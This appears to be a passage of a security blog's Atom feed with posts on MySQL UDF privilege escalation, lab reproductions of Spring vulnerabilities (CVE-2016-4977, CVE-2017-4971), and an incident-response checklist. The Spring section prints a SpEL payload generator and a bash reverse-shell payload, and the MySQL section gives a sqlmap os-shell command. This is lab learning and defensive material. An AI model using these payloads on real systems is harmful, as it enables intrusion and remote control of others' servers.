<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>uSu渗透吧</title>
  
  
  <link href="https://lanxin-1.github.io/blog/atom.xml" rel="self"/>
  
  <link href="https://lanxin-1.github.io/blog/"/>
  <updated>2022-08-17T04:45:06.707Z</updated>
  <id>https://lanxin-1.github.io/blog/</id>
  
  <author>
    <name>爱意深埋珊瑚海</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mysql提权</title>
    <link href="https://lanxin-1.github.io/blog/2022/08/17/Mysql%E6%8F%90%E6%9D%83/"/>
    <id>https://lanxin-1.github.io/blog/2022/08/17/Mysql%E6%8F%90%E6%9D%83/</id>
    <published>2022-08-17T04:42:27.000Z</published>
    <updated>2022-08-17T04:45:06.707Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql </p><h5 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h5><p>原理：利用自定义执行函数导出dll文件进行命令执行（基于Mysql调用命令执行函数）</p><p>UDF：Mysql中用户自定义函数，用户定义的函数被编译为库文件被调用，类似于自定义的DLL函数。</p><p>条件：已远程登录mysql且具有写入文件的权限，即secure_file_priv的值为空。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv:限制load dumpfile、into outfile、load_file()在哪个目录下具有上传、读取权限</span><br><span class="line">--&gt;secure_file_priv值为null，不允许导入、导出；</span><br><span class="line">--&gt;secure_file_priv值为目录，则只允许在该目录下导入、导出；</span><br><span class="line">--&gt;secure_file_priv值为空，则不做限制</span><br></pre></td></tr></table></figure><p>提权结果：获取目标主机当前用户的权限</p><p>基本语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;  //查看mysql是否有写入文件权限，即查询secure_file_priv的值</span><br><span class="line">select version();    //查询mysql版本</span><br><span class="line">select @@basedir;   //查询mysql安装路径（目录）</span><br><span class="line">select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX ALLOCATION&#x27;;   //手工创建plugin目录</span><br></pre></td></tr></table></figure><p>mysql&lt;5.1    dll导出目录 :c:/windows或system32  如：C:\Windows\udf.dll</p><p>mysql&gt;=5.1    dll导出目录：/lib/plugin/    （plugin默认不存在，需要创建）</p><p>plugin文件夹创建成功后使用sqlmap进行提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap -d &quot;mysql://root:root@目的IP:3306/mysql&quot; --os-shell</span><br></pre></td></tr></table></figure><p>限制条件：</p><ul><li><p>root用户允许外连</p></li><li><p>Mysql版本大于5.1时，需手动创建plugin文件夹</p></li><li><p>mysql有写入文件的权限，即secure_file_priv的值为空，但此值默认为NULL，即无权限写入</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Mysql &lt;/p&gt;
&lt;h5 id=&quot;UDF提权&quot;&gt;&lt;a href=&quot;#UDF提权&quot; class=&quot;headerlink&quot; title=&quot;UDF提权&quot;&gt;&lt;/a&gt;UDF提权&lt;/h5&gt;&lt;p&gt;原理：利用自定义执行函数导出dll文件进行命令执行（基于Mysql调用命令执行函数）&lt;/</summary>
      
    
    
    
    <category term="权限提升" scheme="https://lanxin-1.github.io/blog/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
    <category term="mysql提权" scheme="https://lanxin-1.github.io/blog/tags/mysql%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Spring系列复现</title>
    <link href="https://lanxin-1.github.io/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/"/>
    <id>https://lanxin-1.github.io/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-08-17T04:32:12.000Z</published>
    <updated>2022-08-17T04:44:20.982Z</updated>
    
    <content type="html"><![CDATA[<p>spring</p><h3 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h3><p>H2 database是一款Java内存数据库，自带一个Web管理页面，在Spirng开发中，如果设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.enabled=true</span><br><span class="line">spring.h2.console.settings.web-allow-others=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">工具：https://github.com/welk1n/JNDI-Injection-Exploit</span><br><span class="line">流程：攻击机生成恶意类，靶机远程加载恶意类</span><br><span class="line"></span><br><span class="line">1.访问http://your-ip:8080/h2-console/</span><br><span class="line">2.使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具生成payload</span><br><span class="line">Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C ‘命令’ -A 监听机IP</span><br><span class="line">tips：命令生成链接：https://forum.ywhack.com/shell.php    https://forum.ywhack.com/reverse-shell/</span><br><span class="line">3.DriverClass 填javax.naming.InitialContext</span><br><span class="line">4.JDBC URL填第二步中生成的rmi url</span><br></pre></td></tr></table></figure><h3 id="Spring-Security-OAuth2-RCE漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-RCE漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 RCE漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 RCE漏洞（CVE-2016-4977）</h3><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>访问:</p><p><a href="http://your-ip:8080/oauth/authorize?response_type=$%7B233*233%7D&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test">http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a></p><p>若SpEL表达式<code>$&#123;233*233&#125;</code>已经成功执行并返回结果则存在漏洞;</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/1.png" class title="uSu"> <p>使用EXP.py反弹shell,将EXP.py生成的SpEL替换,访问,即可成功反弹shell</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/2.png" class title="uSu"> <img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/3.png" class title="uSu"> <p><strong>EXP.py</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">message = input(&#x27;Enter message to encode:&#x27;)</span><br><span class="line"></span><br><span class="line">exp = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   exp += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch)</span><br><span class="line">exp += &#x27;)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">with open(&#x27;exp.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">   f.write(exp)</span><br></pre></td></tr></table></figure><h3 id="Spring-WebFlow-RCE漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-RCE漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow RCE漏洞（CVE-2017-4971）"></a>Spring WebFlow RCE漏洞（CVE-2017-4971）</h3><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>复现环境：vulhub docker</p><p>访问 ip:8080/login       使用提供的账号登录</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/4.png" class title="uSu"> <p>登录-&gt;然后访问ip:8080/hotels/1 -&gt;Book hotel-&gt;&gt;提交信息-&gt;&gt;点击confirm抓这个包-&gt;&gt;添加字段payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub</span><br><span class="line">需编码为:</span><br><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.88.131/4455+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/5.png" class title="uSu"> <p>反弹shell成功</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/6.png" class title="uSu"> <h3 id="Spring-Data-Rest-RCE漏洞（CVE-2017-8046）"><a href="#Spring-Data-Rest-RCE漏洞（CVE-2017-8046）" class="headerlink" title="Spring Data Rest RCE漏洞（CVE-2017-8046）"></a>Spring Data Rest RCE漏洞（CVE-2017-8046）</h3><p>Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现<a href="https://tools.ietf.org/html/rfc6902">RFC6902</a>），path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p><p><strong>影响版本</strong></p><p>Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本<br> Spring Boot 2.0.0M4之前的版本<br> Spring Data release trains Kay-RC3之前的版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;spring&lt;/p&gt;
&lt;h3 id=&quot;H2-Database-Console-未授权访问&quot;&gt;&lt;a href=&quot;#H2-Database-Console-未授权访问&quot; class=&quot;headerlink&quot; title=&quot;H2 Database Console 未授权访问&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://lanxin-1.github.io/blog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="spring" scheme="https://lanxin-1.github.io/blog/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>BlueTeam</title>
    <link href="https://lanxin-1.github.io/blog/2022/08/16/BlueTeam/"/>
    <id>https://lanxin-1.github.io/blog/2022/08/16/BlueTeam/</id>
    <published>2022-08-16T04:23:25.000Z</published>
    <updated>2022-08-16T11:40:34.868Z</updated>
    
    <content type="html"><![CDATA[<p>工具：LiqunShield 、BlueTeam_ABC_123.jar、CobaltStrikeScan.exe、DuckMemoryScan.exe</p><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h3 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h3><img src="/blog/2022/08/16/BlueTeam/1.png" class title="Process"> <h3 id="溯源方式"><a href="#溯源方式" class="headerlink" title="溯源方式"></a>溯源方式</h3><img src="/blog/2022/08/16/BlueTeam/2.png" class title="Method"> <h3 id="溯源分析思路"><a href="#溯源分析思路" class="headerlink" title="溯源分析思路"></a>溯源分析思路</h3><p>溯源分析的整体思路可以依据：文件排查-进程排查-系统信息排查-工具排查-日志排查，五个步骤</p><h3 id="病毒溯源分析工具"><a href="#病毒溯源分析工具" class="headerlink" title="病毒溯源分析工具"></a>病毒溯源分析工具</h3><h4 id="1-病毒分析"><a href="#1-病毒分析" class="headerlink" title="1.病毒分析"></a>1.病毒分析</h4><p><strong>1. 病毒分析</strong></p><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><h4 id="2-病毒查杀"><a href="#2-病毒查杀" class="headerlink" title="2. 病毒查杀"></a><strong>2. 病毒查杀</strong></h4><p>卡巴斯基**:**  <a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p><p>火绒安全软件**:** <a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><h4 id="3-webshell查杀"><a href="#3-webshell查杀" class="headerlink" title="3.webshell查杀"></a><strong>3.webshell查杀</strong></h4><p>D盾_Web查杀: <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马webshell查杀: <a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><h3 id="常用分析工具Windows"><a href="#常用分析工具Windows" class="headerlink" title="常用分析工具Windows"></a><strong>常用分析工具Windows</strong></h3><p>系统启动相关：Autoruns、Msconfig、Net</p><p>系统进程分析监控：Process explorer、Process Monitor、Tasklist</p><p>端口网络状态：Tcpview、Currports、Netstat</p><p>综合安全检测：Wsyscheck、PowerTool、PCHunter、WIN64AST</p><h3 id="病毒溯源分析工具linux"><a href="#病毒溯源分析工具linux" class="headerlink" title="病毒溯源分析工具linux"></a><strong>病毒溯源分析工具linux</strong></h3><p><strong>Rootkit查杀</strong></p><p>chkrootkit 网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><p><strong>webshell查杀</strong></p><p>linux版：</p><p>河马webshell查杀：<a href="http://www.shellpub.com/">http://www.shellpub.com</a></p><p><strong>linux安全检查脚本</strong></p><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a> </p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><p><strong>常用分析工具linux</strong></p><p>rookit检查：</p><p>Rkhunter、chkrookit、LiveCD引导拯救光盘</p><h2 id="Windos入侵排查"><a href="#Windos入侵排查" class="headerlink" title="Windos入侵排查"></a>Windos入侵排查</h2><p><strong>windows</strong></p><p>隐藏账号排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">wmic useraccount get name,SID</span><br></pre></td></tr></table></figure><p>账户登录日志排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows日志-&gt;安全日志</span><br><span class="line">4624-登录成功   // 详细信息可查看登录IP</span><br><span class="line">4625-登陆失败</span><br><span class="line">4720-账户创建</span><br><span class="line">4724-尝试重置账户密码</span><br><span class="line">4738-账户已更改</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query user     //查看当前登录用户（或任务管理器-&gt;用户）</span><br><span class="line">logoff 会话名   //踢出用户 (或任务管理器-&gt;用户-&gt;断开连接)</span><br></pre></td></tr></table></figure><p><strong>二、网络连接状态</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netstat -nao  //进程、正在连接的会话、监听的端口</span><br><span class="line">任务管理器查看进程号对应进程是否为正常进程</span><br><span class="line">netstat -ano | findstr EST // 已建立的连接</span><br><span class="line">net session 查看会话</span><br><span class="line">netstat -ant //-a 显示所有网络连接、路由表和网络接口信息</span><br><span class="line">-n 数字的形式显示地址和端口号；-o 显示与每个链接相关的所属进程ID</span><br><span class="line">Listening、Esablished、Close_wait 三个网络状态需注意</span><br></pre></td></tr></table></figure><p><strong>三、进程排查</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks.exe  // 计划任务排查</span><br><span class="line">services.msc  // 服务自启排查</span><br><span class="line">tasklist</span><br><span class="line">--&gt;Pchunter</span><br><span class="line">--&gt;火绒剑</span><br></pre></td></tr></table></figure><p>1.检查服务器内部异常启动项<br>a.登录服务器，选择<strong>开始</strong> &gt; <strong>所有程序</strong>&gt;<strong>启动</strong>    。</p><p>b.默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</p><p>cmd-&gt; msconfig，查看是否存在命名异常的启动项目，若存在则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</p><p>cmd-&gt; regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：<br>$$<br>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<strong>四、文件排查</strong><br>$$<br>webshell-当有文件上传或者其他漏洞时常落地文件<br>比较MD5值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile .\1.jsp</span><br><span class="line">certutil -hashfile .\1.jsp MD5  //查看文件MD５值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.jsp&quot; |xargs grep &quot;exec(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.php&quot; |xargs grep &quot;eval(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.asp&quot; |xargs grep &quot;execute(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.aspx&quot; |xargs grep &quot;eval(&quot;</span><br><span class="line">find ./ -type f -name &quot;*.php&quot; |xargs grep &quot;base64 decode&quot;</span><br></pre></td></tr></table></figure><p>mimakatz-用于破解域或者计算机密码<br>远控-常见为CS上线样本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">针对CS上线,常使用DNS上线</span><br><span class="line">该方式上线只会发现DNS请求</span><br><span class="line">在流量请求中排查可疑域名</span><br></pre></td></tr></table></figure><p>frp-内网渗透端口转发<br>Powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get-history | format-list -property *   //查看历史命令 </span><br><span class="line">历史命令文件查看:</span><br><span class="line">powershell&gt;=5.0.1   版本过低需安装PSReadline</span><br><span class="line">C:\Users\Adminstrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</span><br></pre></td></tr></table></figure><p>Empire-类似metasploit,针对powershell利用<br>sockscap-端口转发<br>Proxychains-做socks代理(linux自带)<br>Portscan.ps-针对windows端口扫描的powershell脚本<br>PowerShell-AD-Recon 针对windows域管理的各种脚本,域渗透必备</p><p>简单丢入沙箱进行加检查-&gt;&gt;使用干净操作系统–&gt;&gt;网络监测</p><p>样本分析技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike,使用go语言生成后门程序时,会在程序字符串汇中保存go语言的相关组件,记录组件的方式路径+组件名称,如果没有加壳,可直接进行string分析</span><br></pre></td></tr></table></figure><h2 id="Linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h2><h2 id><a href="#" class="headerlink" title></a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd   //用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br><span class="line">last |more  // 查看登录IP</span><br><span class="line">lastlog  // 登录日志</span><br><span class="line">who  //查看会话</span><br><span class="line">who am i //查看当前所有会话</span><br><span class="line">pkill -kill -t 会话名</span><br><span class="line">awk -F &#x27;length($2)==0 (print$1)&#x27; etc/passwd</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line">grep -o &quot;Failed password&quot; /var/log/secure|uniq -c  // 登录错误的密码</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|head -1</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|tail -1</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小技巧： more /etc/cron.daily/* 查看目录下所有文件</span><br></pre></td></tr></table></figure><ol start="2"><li><p>使用<strong>last</strong>命令查看下服务器近期登录的帐户记录，确认是否有可疑 IP 登录过机器：</p><ul><li>检查说明：攻击者或者恶意软件往往会往系统中注入隐藏的系统帐户实施提权或其他破坏性的攻击。</li><li>解决方法：检查发现有可疑用户时，可使用命令<code>usermod -L 用户名</code>禁用用户或者使用命令<code>userdel -r 用户名</code>删除用户。</li></ul></li><li><p>通过less /var/log/secure|grep ‘Accepted’</p><p>命令，查看是否有可疑 IP 成功登录机器：</p><p>检查说明：攻击者或者恶意软件往往会往系统中注入隐藏的系统帐户实施提权或其他破坏性的攻击。<br>解决方法： 使用命令<code>usermod -L 用户名</code>禁用用户或者使用命令<code>userdel -r 用户名</code>删除用户。</p></li><li><p>检查</p><p>文件，看是否有非授权帐户登录：</p><ul><li>检查说明：攻击者或者恶意软件往往会往系统中注入隐藏的系统帐户实施提权或其他破坏性的攻击。</li></ul></li></ol><ul><li>解决方法： 使用命令<code>usermod -L 用户名</code>禁用用户或者使用命令<code>userdel -r 用户名</code>删除用户。</li></ul><p><strong>二、网络连接排查</strong></p><ol><li><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br><span class="line">netstat -antlp</span><br><span class="line">netstat -antlp | more</span><br><span class="line">ps aux |grep pid</span><br><span class="line">ls -l /proc/$PID/exe   // 查看下 pid 所对应的进程文件路径，</span><br></pre></td></tr></table></figure><p>查看服务器是否有未被授权的端口被监听，查看下对应的 pid。</p><p>检查服务器是否存在恶意进程,恶意进程往往会开启监听端口，与外部控制机器进行连接。</p><p>解决方法：</p><ol><li>若发现有非授权进程，运行<code>ls -l /proc/$PID/exe</code>或<code>file /proc/$PID/exe</code>（$PID 为对应的 pid 号），查看下 pid 所对应的进程文件路径。</li><li>如果为恶意进程，删除对应的文件即可。</li></ol></li><li><p>使用<strong>ps -ef</strong>和top命令查看是否有异常进程</p><ul><li>检查说明：运行以上命令，当发现有名称不断变化的非授权进程占用大量系统 CPU 或内存资源时，则可能为恶意程序。</li><li>解决方法：确认该进程为恶意进程后，可以使用<code>kill -9 进程名</code>命令结束进程，或使用防火墙限制进程外联。</li></ul></li></ol><p><strong>三、进程/启动项排查</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">lsof -p PID 查看进程打开的文件</span><br><span class="line">ps -ef |awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  //连接&gt;2隐藏进程排查</span><br><span class="line">检查开机自启项</span><br><span class="line">more /etc/rc.local </span><br><span class="line">/etc/rc.d/rc[0~6].d </span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br><span class="line">检查定时任务 （检查以下目录是否存在恶意脚本）</span><br><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab </span><br><span class="line">/etc/cron.d/* </span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/* </span><br><span class="line">/etc/cron.weekly/ </span><br><span class="line">/etc/anacrontab </span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><ol><li><p>使用<strong>chkconfig –list</strong>和<strong>cat /etc/rc.local</strong></p><p>命令，查看开机启动项中是否有异常的启动服务。</p><ul><li>检查说明：恶意程序往往会添加在系统的启动项，在用户关机重启后再次运行。</li><li>解决方法：如发现有恶意进程，可使用<code>chkconfig 服务名 off</code>命令关闭，同时检查<code>/etc/rc.local</code>中是否有异常项目，如有请注释掉。</li></ul></li><li><p>进入 cron 文件目录，查看是否存在非法定时任务脚本，查</p><p>看<code>/etc/crontab</code>，<code>/etc/cron.d</code>，<code>/etc/cron.daily</code>，<code>cron.hourly/</code>，<code>cron.monthly</code>，<code>cron.weekly/</code>是否存在可疑脚本或程序。</p><ul><li>解决方法：如发现有不认识的计划任务，可定位脚本确认是否正常业务脚本，如果非正常业务脚本，可直接注释掉任务内容或删除脚本。</li></ul></li></ol><p><strong>四、检查第三方软件漏洞</strong></p><ol><li><p>如果您服务器内有运行 Web、数据库等应用服务，请您限制应用程序帐户对文件系统的写权限，同时尽量使用非 root 帐户运行。</p><ul><li><p>检查说明：使用非 root 帐户运行，可以保障在应用程序被攻陷后，攻击者无法立即远程控制服务器，减少攻击损失。</p></li><li><p>解决方法：</p><ol><li>进入 web 服务根目录或数据库配置目录。</li><li>运行<code>chown -R apache:apache /var/www/xxxx</code>、<code>chmod -R 750 file1.txt</code>命令配置网站访问权限。</li></ol></li><li><p><a href="https://cloud.tencent.com/document/product/296/9604#ex">参考示例</a></p></li></ul></li><li><p>升级修复应用程序漏洞</p><ul><li>检查说明：机器被入侵，部分原因是系统使用的应用程序软件版本较老，存在较多的漏洞而没有修复，导致可以被入侵利用。</li><li>解决方法：比较典型的漏洞例如 ImageMagick、openssl、glibc 等，用户可以根据腾讯云已发布的安全通告指导或通过 apt-get/yum 等方式进行直接升级修复。</li></ul><p><strong>网站目录文件权限的参考示例如下：</strong><br><strong>场景：</strong><br>假设 HTTP 服务器运行的用户和用户组是 www，网站用户为 centos，网站根目录是<code>/home/centos/web</code>。<br><strong>方法/步骤：</strong></p><ol><li><p>我们首先设定网站目录和文件的所有者和所有组为 centos，www，如下命令：                    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R centos:www /home/centos/web</span><br></pre></td></tr></table></figure></li><li><p>设置网站目录权限为750，750是 centos 用户对目录拥有读写执行的权限，设置后，centos 用户可以在任何目录下创建文件，用户组有有读执行权限，这样才能进入目录，其它用户没有任何权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -type d -exec chmod 750 &#123;&#125; \;</span><br></pre></td></tr></table></figure></li><li><p>设置网站文件权限为640，640指只有 centos 用户对网站文件有更改的权限，HTTP 服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。                </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -not -type d -exec chmod 640 &#123;&#125; 